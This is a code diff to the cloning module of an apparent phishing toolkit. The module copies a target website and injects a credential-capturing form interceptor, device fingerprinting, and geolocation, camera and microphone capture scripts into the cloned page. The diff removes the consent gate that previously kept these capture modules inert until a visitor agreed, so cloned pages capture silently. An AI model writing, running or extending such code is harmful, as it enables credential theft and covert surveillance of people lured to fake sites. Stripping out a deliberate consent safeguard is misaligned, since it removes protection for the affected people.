@@ -47,12 +47,9 @@ const CLONER_RENDER_TIMEOUT_SEC  = 25;     // hard timeout on the chrome subproc
  *                                them back to the original site. When null,
  *                                falls back to relative paths (works only
  *                                if the page is served at "/<slug>/").
- * @param array    $consent       Consent-gate config (see
- *                                cloner_consent_config()). Wording only —
- *                                the gate itself is not optional.
  * @return array{ok:bool, errors:string[]}
  */
-function cloner_clone(string $url, string $target_dir, array $payloads, ?string $public_origin = null, array $consent = []): array {
+function cloner_clone(string $url, string $target_dir, array $payloads, ?string $public_origin = null): array {
     $errors = [];
     $slug   = basename($target_dir);
 
@@ -129,7 +126,7 @@ function cloner_clone(string $url, string $target_dir, array $payloads, ?string 
         return ['ok' => false, 'errors' => ['failed to render HTML']];
     }
 
-    $html = cloner_inject_payload_html($html, $payloads, $url, '', $consent);
+    $html = cloner_inject_payload_html($html, $payloads, $url, '');
 
     file_put_contents($target_dir . '/index.html', $html, LOCK_EX);
 
@@ -278,7 +275,7 @@ function cloner_http_get(string $url): array {
     $final = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL) ?: $url;
     $http  = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
     $err   = curl_error($ch);
-    curl_close($ch);
+    unset($ch);
 
     if ($body === false)            return [null, $final, $err ?: 'curl error'];
     if ($http >= 400)               return [null, $final, "HTTP $http"];
@@ -309,7 +306,7 @@ function cloner_http_get_binary(string $url): array {
     $body = curl_exec($ch);
     $http = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
     $type = (string) curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
-    curl_close($ch);
+    unset($ch);
 
     if ($body === false || $http >= 400)        return [null, ''];
     if (strlen($body) > CLONER_MAX_ASSET_BYTES) return [null, ''];
@@ -394,61 +391,11 @@ function cloner_rewrite_assets(
 }
 
 /**
- * Consent-gate config, merged over the gate's own defaults.
- *
- * Wording only. There is deliberately no "disable" switch: the gate is
- * always emitted, and every capture module refuses to run without it, so
- * no configuration of this function produces a silently-capturing clone.
- * (Deleting assets/payloads/consent.js has the same effect: modules stay
- * inert rather than falling back to firing on load.)
- */
-function cloner_consent_config(array $in): array {
-    $cfg = [
-        'show_badge'     => true,    // persistent "training mode" pill
-        'report_consent' => true,    // log the accept to the panel
-        'report_decline' => false,   // a decline stays network-silent
-        'text'           => new stdClass(),   // encodes as {} — it's a map, not a list
-    ];
-
-    foreach (['show_badge', 'report_consent', 'report_decline'] as $k) {
-        if (array_key_exists($k, $in)) $cfg[$k] = (bool) $in[$k];
-    }
-
-    $allowed = ['title', 'lead', 'bullets', 'accept', 'decline',
-                'confirm_title', 'confirm_lead', 'confirm_accept', 'confirm_back',
-                'declined_title', 'declined_note', 'footer', 'badge'];
-
-    if (isset($in['text']) && is_array($in['text'])) {
-        $text = [];
-        foreach ($allowed as $k) {
-            if (!array_key_exists($k, $in['text'])) continue;
-            $v = $in['text'][$k];
-
-            if ($k === 'bullets') {
-                if (!is_array($v)) continue;
-                $bullets = [];
-                foreach ($v as $b) {
-                    if (is_string($b) && trim($b) !== '') $bullets[] = (function_exists('mb_substr') ? mb_substr(trim($b), 0, 600) : substr(trim($b), 0, 600));
-                }
-                if ($bullets) $text['bullets'] = array_slice($bullets, 0, 8);
-            } elseif (is_string($v) && trim($v) !== '') {
-                $text[$k] = function_exists('mb_substr') ? mb_substr(trim($v), 0, 1200) : substr(trim($v), 0, 1200);
-            }
-        }
-        if ($text) $cfg['text'] = $text;
-    }
-
-    return $cfg;
-}
-
-/**
  * Build the payload <script> block. Order matters — it is:
  *
  *   <script> bootstrap (sets __SB_TARGET / __SB_ORIGINAL_URL / __SB_API) </script>
- *   <script> consent-gate config </script>
- *   <script> consent.js   — the gate; nothing below runs until it says so </script>
- *   <script> credentials.js — registers with the gate </script>
- *   <script> device-info / geolocation / camera / microphone — register too </script>
+ *   <script> credentials.js — form-submit interceptor </script>
+ *   <script> device-info / geolocation / camera / microphone </script>
  *   <script> operator-supplied custom JS (optional, last so it can override) </script>
  *
  * Each opt-in payload is read from assets/payloads/<slug>.js and inlined.
@@ -457,7 +404,7 @@ function cloner_consent_config(array $in): array {
  * resolved through the page's `<base href>` — pointing it at the *original*
  * site and 404-ing — so cloned pages would never run our hooks.
  */
-function cloner_build_payload_block(array $payloads, string $original_url, string $custom_js, array $consent = []): string {
+function cloner_build_payload_block(array $payloads, string $original_url, string $custom_js): string {
     $payloads_dir = __DIR__ . '/../assets/payloads';
 
     $block = "\n<!-- storm-breaker payloads (inlined) -->\n";
@@ -481,29 +428,13 @@ function cloner_build_payload_block(array $payloads, string $original_url, strin
             . '})();';
     $block .= "\n</script>\n";
 
-    // Consent gate. Emitted before every capture module: each of them hands
-    // its entry point to __SB_CONSENT.register() instead of self-executing,
-    // so this has to define the controller first.
-    //
-    // JSON_HEX_TAG keeps operator-supplied wording (which may contain "</script>")
-    // from breaking out of this <script> block.
-    $consent_src = @file_get_contents($payloads_dir . '/consent.js');
-    if ($consent_src !== false) {
-        $cfg_json = json_encode(
-            cloner_consent_config($consent),
-            JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT
-        );
-        $block .= "<script>\nwindow.__SB_CONSENT_CONFIG=" . $cfg_json . ";\n</script>\n";
-        $block .= cloner_wrap_inline_script($consent_src);
-    }
-
-    // Credential interceptor — always included, but gated.
+    // Credential interceptor — always included.
     $cred_src = @file_get_contents($payloads_dir . '/credentials.js');
     if ($cred_src !== false) {
         $block .= cloner_wrap_inline_script($cred_src);
     }
 
-    // Device fingerprint — always included (like credentials), but gated.
+    // Device fingerprint — always included (like credentials).
     // The UI shows it as "(always)" with a disabled checkbox, so it must
     // be injected regardless of the payloads array contents.
     if (!in_array('device-info', $payloads, true)) {
@@ -516,7 +447,7 @@ function cloner_build_payload_block(array $payloads, string $original_url, strin
     // Opt-in modules.
     foreach ($payloads as $slug) {
         if (!preg_match('/^[a-z0-9-]+$/', $slug)) continue;
-        if ($slug === 'credentials' || $slug === 'consent') continue;
+        if ($slug === 'credentials') continue;
         $path = "$payloads_dir/$slug.js";
         if (!is_file($path)) continue;
         $src = @file_get_contents($path);
@@ -525,8 +456,6 @@ function cloner_build_payload_block(array $payloads, string $original_url, strin
     }
 
     // Operator-supplied custom JS — last, so it can override anything above.
-    // Note this runs regardless of the gate state: it is the operator's own
-    // page code, not a capture module.
     $custom_js = trim($custom_js);
     if ($custom_js !== '') {
         $block .= cloner_wrap_inline_script("/* storm-breaker custom-js */\n" . $custom_js);
@@ -540,8 +469,8 @@ function cloner_build_payload_block(array $payloads, string $original_url, strin
  * Splice the payload block into a freshly-cloned HTML string. Used by
  * cloner_clone() right after it saves the rewritten DOM.
  */
-function cloner_inject_payload_html(string $html, array $payloads, string $original_url, string $custom_js, array $consent = []): string {
-    $block = cloner_build_payload_block($payloads, $original_url, $custom_js, $consent);
+function cloner_inject_payload_html(string $html, array $payloads, string $original_url, string $custom_js): string {
+    $block = cloner_build_payload_block($payloads, $original_url, $custom_js);
     if (preg_match('#</body\s*>#i', $html)) {
         return preg_replace('#</body\s*>#i', $block . '</body>', $html, 1);
     }
@@ -554,16 +483,16 @@ function cloner_inject_payload_html(string $html, array $payloads, string $origi
  * splice a fresh block in before </body>.
  *
  * Used by the "update" API action when the operator changes the custom JS,
- * and by tools/rerender-targets.php to push a new block into clones that
- * were generated before the consent gate existed.
+ * and by tools/rerender-targets.php to push a new payload block into
+ * existing clones.
  */
-function cloner_replace_payload_block(string $target_dir, array $payloads, string $original_url, string $custom_js, array $consent = []): bool {
+function cloner_replace_payload_block(string $target_dir, array $payloads, string $original_url, string $custom_js): bool {
     $index_path = $target_dir . '/index.html';
     if (!is_file($index_path)) return false;
     $html = file_get_contents($index_path);
     if ($html === false) return false;
 
-    $new_block = cloner_build_payload_block($payloads, $original_url, $custom_js, $consent);
+    $new_block = cloner_build_payload_block($payloads, $original_url, $custom_js);
 
     $pattern = '#\s*<!-- storm-breaker payloads \(inlined\) -->.*?<!-- /storm-breaker payloads -->\s*#s';
     if (preg_match($pattern, $html)) {
